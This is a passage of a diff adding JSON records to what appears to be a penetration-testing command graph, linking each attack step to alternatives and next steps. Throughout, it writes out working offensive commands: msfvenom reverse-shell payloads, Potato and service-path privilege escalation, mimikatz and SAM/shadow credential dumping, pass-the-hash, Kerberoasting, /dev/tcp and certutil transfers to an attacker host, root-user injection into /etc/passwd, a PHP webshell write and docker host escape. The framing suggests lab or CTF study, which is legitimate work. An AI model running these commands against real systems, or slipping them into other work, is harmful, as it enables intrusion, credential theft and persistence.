+      "source_command": "file-transfer-php",
+      "relation_type": "next_steps",
+      "command_text": "Upload with: curl -F file=@local.txt http://target/upload.php"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-ftp",
+      "relation_type": "alternatives",
+      "command_text": "Setup Python FTP server: python -m pyftpdlib -p 21"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-dev-tcp",
+      "relation_type": "alternatives",
+      "command_text": "exec 3<>/dev/tcp/<IP>/<PORT>; cat <&3 > file"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-dev-tcp",
+      "relation_type": "alternatives",
+      "command_text": "Use wget/curl if available"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-dev-tcp",
+      "relation_type": "next_steps",
+      "command_text": "On attacker: nc -lvnp <PORT> < file"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "file-transfer-dev-tcp",
+      "relation_type": "next_steps",
+      "command_text": "On target: cat < /dev/tcp/<IP>/<PORT> > output"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-privesc-powerup",
+      "relation_type": "alternatives",
+      "command_text": "Use individual PowerUp functions"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-privesc-powerup",
+      "relation_type": "next_steps",
+      "command_text": "Run Invoke-ServiceAbuse if vulnerable service found"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-privesc-powerup",
+      "relation_type": "next_steps",
+      "command_text": "Use Write-ServiceBinary for DLL hijacking"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-always-install-elevated",
+      "relation_type": "next_steps",
+      "command_text": "Execute: msiexec /quiet /qn /i payload.msi"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-registry-autologon",
+      "relation_type": "next_steps",
+      "command_text": "Use for lateral movement"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-dll-hijacking",
+      "relation_type": "next_steps",
+      "command_text": "Use Process Monitor to find missing DLLs"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-potato-exploits",
+      "relation_type": "alternatives",
+      "command_text": "JuicyPotato.exe -l 1337 -p cmd.exe -t *"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-potato-exploits",
+      "relation_type": "alternatives",
+      "command_text": "PrintSpoofer.exe -i -c cmd"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-potato-exploits",
+      "relation_type": "next_steps",
+      "command_text": "Use JuicyPotato for Windows < 2019"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-potato-exploits",
+      "relation_type": "next_steps",
+      "command_text": "Use PrintSpoofer for Windows 10/2019+"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-potato-exploits",
+      "relation_type": "next_steps",
+      "command_text": "Use RoguePotato as alternative"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-saved-credentials",
+      "relation_type": "alternatives",
+      "command_text": "rundll32 keymgr.dll,KRShowKeyMgr"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-saved-credentials",
+      "relation_type": "next_steps",
+      "command_text": "Use runas /savecred with found credentials"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-saved-credentials",
+      "relation_type": "next_steps",
+      "command_text": "Use for lateral movement"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-password-files",
+      "relation_type": "alternatives",
+      "command_text": "findstr /si password *.txt *.xml *.ini"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-password-files",
+      "relation_type": "alternatives",
+      "command_text": "PowerShell: Get-ChildItem -Recurse | Select-String -Pattern 'password'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-sam-system-backup",
+      "relation_type": "alternatives",
+      "command_text": "Copy from C:\\Windows\\Repair\\"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "win-sam-system-backup",
+      "relation_type": "alternatives",
+      "command_text": "Use mimikatz lsadump::sam"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-whoami-privs",
+      "relation_type": "alternatives",
+      "command_text": "whoami /all"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-whoami-privs",
+      "relation_type": "next_steps",
+      "command_text": "SeImpersonatePrivilege: Use JuicyPotato/PrintSpoofer"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-whoami-privs",
+      "relation_type": "next_steps",
+      "command_text": "SeBackupPrivilege: Read SAM/SYSTEM hives"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-systeminfo",
+      "relation_type": "next_steps",
+      "command_text": "Search exploits: searchsploit windows <version>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-unquoted-service",
+      "relation_type": "alternatives",
+      "command_text": "Get-WmiObject win32_service | Select Name, PathName"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-unquoted-service",
+      "relation_type": "alternatives",
+      "command_text": "sc qc <service>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-unquoted-service",
+      "relation_type": "next_steps",
+      "command_text": "Create malicious exe: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > Service.exe"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-unquoted-service",
+      "relation_type": "next_steps",
+      "command_text": "Place exe in path: copy Service.exe \"C:\\Program Files\\Service.exe\""
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-unquoted-service",
+      "relation_type": "next_steps",
+      "command_text": "Restart service: sc stop <service> && sc start <service>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-alwaysinstallelevated",
+      "relation_type": "alternatives",
+      "command_text": "Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-alwaysinstallelevated",
+      "relation_type": "next_steps",
+      "command_text": "Create malicious MSI: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > shell.msi"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-alwaysinstallelevated",
+      "relation_type": "next_steps",
+      "command_text": "Install MSI: msiexec /quiet /qn /i shell.msi"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-scheduled-tasks",
+      "relation_type": "alternatives",
+      "command_text": "Get-ScheduledTask | Select TaskName,Principal"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-scheduled-tasks",
+      "relation_type": "alternatives",
+      "command_text": "dir C:\\Windows\\System32\\Tasks"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-scheduled-tasks",
+      "relation_type": "next_steps",
+      "command_text": "Force run: schtasks /run /tn <task_name>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-service-permissions",
+      "relation_type": "alternatives",
+      "command_text": "sc sdshow <service>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-service-permissions",
+      "relation_type": "alternatives",
+      "command_text": "Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<service>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-service-permissions",
+      "relation_type": "next_steps",
+      "command_text": "Query service: sc qc <service>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-service-permissions",
+      "relation_type": "next_steps",
+      "command_text": "Change binary path: sc config <service> binPath= \"C:\\temp\\shell.exe\""
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-service-permissions",
+      "relation_type": "next_steps",
+      "command_text": "Restart service: sc stop <service> && sc start <service>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-service-permissions",
+      "relation_type": "next_steps",
+      "command_text": "Restore original: sc config <service> binPath= \"<original_path>\""
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-potato-attacks",
+      "relation_type": "alternatives",
+      "command_text": "PrintSpoofer.exe -i -c cmd"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-potato-attacks",
+      "relation_type": "alternatives",
+      "command_text": "SweetPotato.exe -p cmd"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-potato-attacks",
+      "relation_type": "next_steps",
+      "command_text": "CLSID list: https://github.com/ohpe/juicy-potato/tree/master/CLSID"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-potato-attacks",
+      "relation_type": "next_steps",
+      "command_text": "Alternative: PrintSpoofer.exe -i -c cmd"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-sam-system-backup",
+      "relation_type": "next_steps",
+      "command_text": "Copy files: copy C:\\Windows\\repair\\SAM C:\\temp\\"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-sam-system-backup",
+      "relation_type": "next_steps",
+      "command_text": "Transfer to attacker: certutil -urlcache -f http://<IP>/nc.exe nc.exe"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-sam-system-backup",
+      "relation_type": "next_steps",
+      "command_text": "Extract hashes: impacket-secretsdump -sam SAM -system SYSTEM LOCAL"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-sam-system-backup",
+      "relation_type": "next_steps",
+      "command_text": "Crack or PTH: hashcat -m 1000 hashes.txt wordlist.txt"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-stored-credentials",
+      "relation_type": "alternatives",
+      "command_text": "dir C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-stored-credentials",
+      "relation_type": "alternatives",
+      "command_text": "vaultcmd /listcreds:\"Windows Credentials\""
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-stored-credentials",
+      "relation_type": "next_steps",
+      "command_text": "Run as stored user: runas /savecred /user:admin cmd"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-stored-credentials",
+      "relation_type": "next_steps",
+      "command_text": "PowerShell: $cred = Get-Credential; Start-Process cmd -Credential $cred"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-dpapi-masterkeys",
+      "relation_type": "next_steps",
+      "command_text": "Extract with Mimikatz: dpapi::masterkey /in:<masterkey>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-autologon",
+      "relation_type": "alternatives",
+      "command_text": "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-autologon",
+      "relation_type": "next_steps",
+      "command_text": "Use credentials: net use \\\\<IP> /user:<user> <password>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-autologon",
+      "relation_type": "next_steps",
+      "command_text": "RDP access: mstsc /v:<IP>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-autologon",
+      "relation_type": "next_steps",
+      "command_text": "PSExec: psexec.py <domain>/<user>:<pass>@<IP>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-pass-the-hash",
+      "relation_type": "alternatives",
+      "command_text": "sekurlsa::pth /user:admin /ntlm:<hash> /domain:."
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-pass-the-hash",
+      "relation_type": "alternatives",
+      "command_text": "Invoke-Mimikatz -DumpCreds"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-pass-the-hash",
+      "relation_type": "next_steps",
+      "command_text": "PTH with psexec: psexec.py -hashes <LM>:<NTLM> administrator@<IP>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-pass-the-hash",
+      "relation_type": "next_steps",
+      "command_text": "Evil-WinRM: evil-winrm -i <IP> -u Administrator -H <hash>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-pass-the-hash",
+      "relation_type": "next_steps",
+      "command_text": "SMB access: smbclient //<IP>/C$ -U Administrator --pw-nt-hash <hash>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-pass-the-hash",
+      "relation_type": "next_steps",
+      "command_text": "Crack hash: hashcat -m 1000 hash.txt rockyou.txt"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-kerberoasting",
+      "relation_type": "alternatives",
+      "command_text": "GetUserSPNs.py <domain>/<user>:<pass>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-kerberoasting",
+      "relation_type": "next_steps",
+      "command_text": "Request tickets: Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '<SPN>'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-kerberoasting",
+      "relation_type": "next_steps",
+      "command_text": "Export tickets: mimikatz kerberos::list /export"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-kerberoasting",
+      "relation_type": "next_steps",
+      "command_text": "Crack offline: hashcat -m 13100 ticket.kirbi wordlist.txt"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-kerberoasting",
+      "relation_type": "next_steps",
+      "command_text": "Use Rubeus: Rubeus.exe kerberoast"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-dll-hijacking",
+      "relation_type": "alternatives",
+      "command_text": "icacls C:\\Progra~1\\*"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-dll-hijacking",
+      "relation_type": "alternatives",
+      "command_text": "dir /s /b C:\\*.dll 2>nul"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "windows-dll-hijacking",
+      "relation_type": "next_steps",
+      "command_text": "Create malicious DLL: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> -f dll > hijack.dll"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "check-sudo-privs",
+      "relation_type": "alternatives",
+      "command_text": "cat /etc/sudoers (if readable)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "check-sudo-privs",
+      "relation_type": "alternatives",
+      "command_text": "sudo -ll (detailed output)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "gtfobins-sudo-lookup",
+      "relation_type": "alternatives",
+      "command_text": "Search exploit-db: searchsploit sudo <binary-name>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "gtfobins-sudo-lookup",
+      "relation_type": "alternatives",
+      "command_text": "Google: '<binary-name> sudo privilege escalation'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "gtfobins-sudo-lookup",
+      "relation_type": "alternatives",
+      "command_text": "HackTricks: https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "gtfobins-sudo-lookup",
+      "relation_type": "next_steps",
+      "command_text": "execute-sudo-exploit"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "sudo-exploit-find",
+      "relation_type": "alternatives",
+      "command_text": "sudo find / -name '*' -exec /bin/bash \\; -quit"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "sudo-exploit-find",
+      "relation_type": "alternatives",
+      "command_text": "sudo find . -exec /bin/sh \\; -quit"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "sudo-exploit-vim",
+      "relation_type": "alternatives",
+      "command_text": "sudo vim (then type: :!/bin/bash)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "sudo-exploit-vim",
+      "relation_type": "alternatives",
+      "command_text": "sudo vim (then type: :set shell=/bin/bash then :shell)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "sudo-exploit-vim",
+      "relation_type": "alternatives",
+      "command_text": "sudo vi -c ':!/bin/bash'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "sudo-exploit-python",
+      "relation_type": "alternatives",
+      "command_text": "sudo python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "sudo-exploit-python",
+      "relation_type": "alternatives",
+      "command_text": "sudo python -c 'import subprocess; subprocess.call([\"/bin/bash\"])'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "sudo-exploit-python",
+      "relation_type": "alternatives",
+      "command_text": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "sudo-exploit-python",
+      "relation_type": "alternatives",
+      "command_text": "sudo python2 -c 'import os; os.system(\"/bin/bash\")'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "sudo-exploit-less",
+      "relation_type": "alternatives",
+      "command_text": "sudo more /etc/profile (then !bash)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "sudo-exploit-less",
+      "relation_type": "alternatives",
+      "command_text": "sudo less /etc/passwd"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "sudo-exploit-nmap",
+      "relation_type": "alternatives",
+      "command_text": "sudo nmap --script=<script>.nse (if script writable, inject command)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "verify-root-access",
+      "relation_type": "alternatives",
+      "command_text": "ls -la /root/ (check if can list root directory)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "verify-root-access",
+      "relation_type": "alternatives",
+      "command_text": "cat /etc/shadow (attempt to read directly)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "verify-root-access",
+      "relation_type": "alternatives",
+      "command_text": "sudo -l (verify can run all commands as root)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "verify-root-access",
+      "relation_type": "next_steps",
+      "command_text": "Read root flag: cat /root/proof.txt or cat /root/root.txt"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "verify-root-access",
+      "relation_type": "next_steps",
+      "command_text": "Extract credentials: cat /etc/shadow"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "gtfobins-suid-lookup",
+      "relation_type": "alternatives",
+      "command_text": "Search exploit-db: searchsploit <binary-name>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "gtfobins-suid-lookup",
+      "relation_type": "next_steps",
+      "command_text": "execute-suid-exploit"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "execute-suid-exploit-find",
+      "relation_type": "alternatives",
+      "command_text": "execute-suid-exploit-vim"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "execute-suid-exploit-find",
+      "relation_type": "alternatives",
+      "command_text": "execute-suid-exploit-nmap"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "execute-suid-exploit-find",
+      "relation_type": "alternatives",
+      "command_text": "execute-suid-exploit-base64"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "verify-root-access",
+      "relation_type": "alternatives",
+      "command_text": "ls -la /root/"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "verify-root-access",
+      "relation_type": "alternatives",
+      "command_text": "cat /etc/shadow"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "verify-root-access",
+      "relation_type": "alternatives",
+      "command_text": "sudo -l"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "verify-root-access",
+      "relation_type": "next_steps",
+      "command_text": "Read root flag: cat /root/proof.txt"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "verify-root-access",
+      "relation_type": "next_steps",
+      "command_text": "Extract credentials: cat /etc/shadow"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-cred-discover-config",
+      "relation_type": "alternatives",
+      "command_text": "find <PATH> -name '*.php' -exec grep -i password {} +"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-cred-discover-config",
+      "relation_type": "alternatives",
+      "command_text": "find <PATH> -name 'config*' -exec cat {} +"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-enum-users-shells",
+      "relation_type": "alternatives",
+      "command_text": "awk -F: '$7 !~ /(nologin|false)/ {print $1}' /etc/passwd"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-enum-users-shells",
+      "relation_type": "alternatives",
+      "command_text": "getent passwd | grep -v nologin | cut -d: -f1"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-privesc-linpeas",
+      "relation_type": "alternatives",
+      "command_text": "Use LinEnum if LinPEAS fails"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-privesc-linpeas",
+      "relation_type": "next_steps",
+      "command_text": "Focus on RED/YELLOW findings first"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-privesc-linenum",
+      "relation_type": "alternatives",
+      "command_text": "Use curl instead of wget"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-privesc-linenum",
+      "relation_type": "alternatives",
+      "command_text": "Use LinPEAS for more comprehensive scan"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-suid-find",
+      "relation_type": "alternatives",
+      "command_text": "find / -perm -4000 2>/dev/null"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-suid-find",
+      "relation_type": "alternatives",
+      "command_text": "find / -user root -perm -4000 -exec ls -ldb {} \\;"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-suid-find",
+      "relation_type": "next_steps",
+      "command_text": "Run 'strings' on custom binaries"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-sudo-list",
+      "relation_type": "alternatives",
+      "command_text": "sudo -ll for detailed output"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-cron-enum",
+      "relation_type": "alternatives",
+      "command_text": "Use pspy to monitor processes"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-cron-enum",
+      "relation_type": "alternatives",
+      "command_text": "grep -r '/etc/cron' /etc/"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-writable-etc-passwd",
+      "relation_type": "alternatives",
+      "command_text": "openssl passwd -1 -salt salt password"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-writable-etc-passwd",
+      "relation_type": "alternatives",
+      "command_text": "echo 'newroot:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-writable-etc-passwd",
+      "relation_type": "next_steps",
+      "command_text": "Add new root user to /etc/passwd"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-capabilities",
+      "relation_type": "alternatives",
+      "command_text": "Use LinPEAS which includes capability check"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-kernel-exploit",
+      "relation_type": "alternatives",
+      "command_text": "cat /proc/version"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-kernel-exploit",
+      "relation_type": "alternatives",
+      "command_text": "lsb_release -a"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-writable-services",
+      "relation_type": "alternatives",
+      "command_text": "ls -la /etc/systemd/system/*.service"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-nfs-no-root-squash",
+      "relation_type": "next_steps",
+      "command_text": "Execute SUID binary from target"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-docker-escape",
+      "relation_type": "alternatives",
+      "command_text": "docker run -v /:/hostfs -it ubuntu bash"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-docker-escape",
+      "relation_type": "alternatives",
+      "command_text": "LXC/LXD container escape if available"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-docker-escape",
+      "relation_type": "next_steps",
+      "command_text": "Run: docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-ld-preload",
+      "relation_type": "next_steps",
+      "command_text": "Compile with: gcc -fPIC -shared -o shell.so shell.c -nostartfiles"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-ld-preload",
+      "relation_type": "next_steps",
+      "command_text": "Run: sudo LD_PRELOAD=/tmp/shell.so program"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-path-hijack",
+      "relation_type": "next_steps",
+      "command_text": "Execute vulnerable SUID binary"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-ssh-keys",
+      "relation_type": "alternatives",
+      "command_text": "find / -name authorized_keys"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-ssh-keys",
+      "relation_type": "alternatives",
+      "command_text": "grep -r 'PRIVATE KEY' /home 2>/dev/null"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-mysql-udf",
+      "relation_type": "next_steps",
+      "command_text": "SELECT sys_exec('chmod +s /bin/bash')"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-sudo-check",
+      "relation_type": "alternatives",
+      "command_text": "sudo -ll"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-sudo-check",
+      "relation_type": "alternatives",
+      "command_text": "cat /etc/sudoers 2>/dev/null"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-cron-jobs",
+      "relation_type": "alternatives",
+      "command_text": "crontab -l"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-cron-jobs",
+      "relation_type": "alternatives",
+      "command_text": "grep -r . /etc/cron* 2>/dev/null"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-cron-jobs",
+      "relation_type": "next_steps",
+      "command_text": "Exploit wildcards: echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > --checkpoint-action=exec=sh"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-writable-passwd",
+      "relation_type": "alternatives",
+      "command_text": "find /etc -writable 2>/dev/null"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-writable-passwd",
+      "relation_type": "next_steps",
+      "command_text": "Add root user to passwd: echo 'root2:x:0:0:root:/root:/bin/bash' >> /etc/passwd"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-writable-passwd",
+      "relation_type": "next_steps",
+      "command_text": "Add user with UID 0: echo 'hacker:$1$hash:0:0::/root:/bin/bash' >> /etc/passwd"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-writable-passwd",
+      "relation_type": "next_steps",
+      "command_text": "Copy shadow for offline cracking: cat /etc/shadow > /tmp/shadow.txt"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-kernel-version",
+      "relation_type": "alternatives",
+      "command_text": "lsb_release -a"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-kernel-version",
+      "relation_type": "alternatives",
+      "command_text": "cat /etc/os-release"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-kernel-version",
+      "relation_type": "next_steps",
+      "command_text": "Search exploits: searchsploit linux kernel <version>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-kernel-version",
+      "relation_type": "next_steps",
+      "command_text": "Compile exploit: gcc exploit.c -o exploit"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-linpeas",
+      "relation_type": "alternatives",
+      "command_text": "Transfer manually and run: ./linpeas.sh"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-linpeas",
+      "relation_type": "next_steps",
+      "command_text": "Focus on RED/YELLOW findings first"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-pspy",
+      "relation_type": "alternatives",
+      "command_text": "watch -n 1 'ps aux | grep -v grep'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-pspy",
+      "relation_type": "alternatives",
+      "command_text": "while true; do ps aux | grep root; sleep 1; done"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-mysql-root",
+      "relation_type": "alternatives",
+      "command_text": "mysql -u root -p (try blank password)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-mysql-root",
+      "relation_type": "alternatives",
+      "command_text": "mariadb -u root"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-mysql-root",
+      "relation_type": "next_steps",
+      "command_text": "UDF exploitation: SELECT sys_exec('chmod +s /bin/bash')"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-mysql-root",
+      "relation_type": "next_steps",
+      "command_text": "Read files: SELECT LOAD_FILE('/etc/shadow')"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-mysql-root",
+      "relation_type": "next_steps",
+      "command_text": "Write files: SELECT '<?php system($_GET[\"c\"]);?>' INTO OUTFILE '/var/www/html/shell.php'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-nfs-root-squash",
+      "relation_type": "alternatives",
+      "command_text": "showmount -e localhost"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-nfs-root-squash",
+      "relation_type": "alternatives",
+      "command_text": "rpcinfo -p"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-nfs-root-squash",
+      "relation_type": "next_steps",
+      "command_text": "Mount on attacker: mount -t nfs <IP>:/share /mnt"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-nfs-root-squash",
+      "relation_type": "next_steps",
+      "command_text": "Create SUID binary: cp /bin/bash /mnt/bash; chmod +s /mnt/bash"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-nfs-root-squash",
+      "relation_type": "next_steps",
+      "command_text": "Execute on target: /path/to/bash -p"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-systemctl-privesc",
+      "relation_type": "alternatives",
+      "command_text": "ls -la /bin/systemctl"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-systemctl-privesc",
+      "relation_type": "alternatives",
+      "command_text": "getcap /bin/systemctl"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-systemctl-privesc",
+      "relation_type": "next_steps",
+      "command_text": "Create service file: echo '[Service]\\nType=oneshot\\nExecStart=/bin/bash -c \"chmod +s /bin/bash\"\\n[Install]\\nWantedBy=multi-user.target' > /tmp/root.service"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-systemctl-privesc",
+      "relation_type": "next_steps",
+      "command_text": "Link service: systemctl link /tmp/root.service"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-systemctl-privesc",
+      "relation_type": "next_steps",
+      "command_text": "Start service: systemctl start root.service"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-systemctl-privesc",
+      "relation_type": "next_steps",
+      "command_text": "Get root shell: /bin/bash -p"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-wildcard-injection",
+      "relation_type": "alternatives",
+      "command_text": "find /etc -name '*.sh' -exec grep '\\*' {} \\;"
+    },
+    {
